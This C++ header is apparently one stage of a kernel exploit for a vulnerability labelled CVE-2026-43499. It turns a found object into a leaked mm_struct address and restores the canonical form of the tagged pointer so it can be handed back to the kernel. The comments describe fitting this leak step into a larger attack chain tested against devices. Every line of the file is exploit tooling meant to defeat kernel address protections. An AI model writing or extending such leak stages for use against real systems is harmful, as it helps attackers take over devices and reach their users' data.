#pragma once
/** @file backend/cve_2026_43499/leak/discovery_result.hpp
 *  A found object, reported the way the contract asks for one.
 *
 *  The contract asks a discovery for a call that fills a result and says whether it worked, and
 *  it keeps two questions apart: whether the mechanism worked, and whether all four addresses are
 *  known. The retired tree answered the first and not the second -- it reported the mm_struct it
 *  had found, left the other three zero, and said ok -- and the device gate of that time shows it
 *  was enough for the step that consumed it. The same shape lives here, and this file exists
 *  because leaving it out was my mistake: I had read the contract as demanding all four, kept the
 *  search deliberately outside it, and said so in a comment.
 *
 *  What it is is a mapping: a found object becomes the mm_struct in canonical form, and anything
 *  else is the failure the contract names. It holds no state, so whoever owns the search outcome
 *  can wrap it in the one-line discover() the concept asks for. An adapter that kept the outcome
 *  itself would be a mutable global by another name.
 */
#include <cstdint>

#include "backend/cve_2026_43499/leak/candidate_match.hpp"
#include "backend/cve_2026_43499/leak/snitch_discovery.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** Restore the canonical form of a tagged address. The tag nibble replaces bits 56 to 59,
     *  so putting it back is what turns a leaked address into one the kernel can be handed. */
    [[nodiscard]] constexpr std::uint64_t canonical_address(std::uint64_t tagged) noexcept {
        return tagged | (kCanonicalTag << 56U);
    }

    /** What a discovery reports: whether it worked, and the object it found. The shape of the
     *  contract result is deliberately not repeated here, so that this file does not become a
     *  second definition of it. */
    struct DiscoveryReport final {
        bool ok = false;
        std::uint64_t mm_struct = 0U;
    };

    /** Map one object search into that report. Only a found object counts: a search that was
     *  refused or that walked its range and found nothing reports the failure, which is the same
     *  rule the preparation's own failure path follows. */
    [[nodiscard]] constexpr DiscoveryReport report_discovery(const ObjectOutcome &answer) noexcept {
        DiscoveryReport report{};
        if (answer.status != ObjectVerdict::Found || answer.object == 0U) {
            return report;
        }
        report.ok = true;
        report.mm_struct = canonical_address(answer.object);
        return report;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
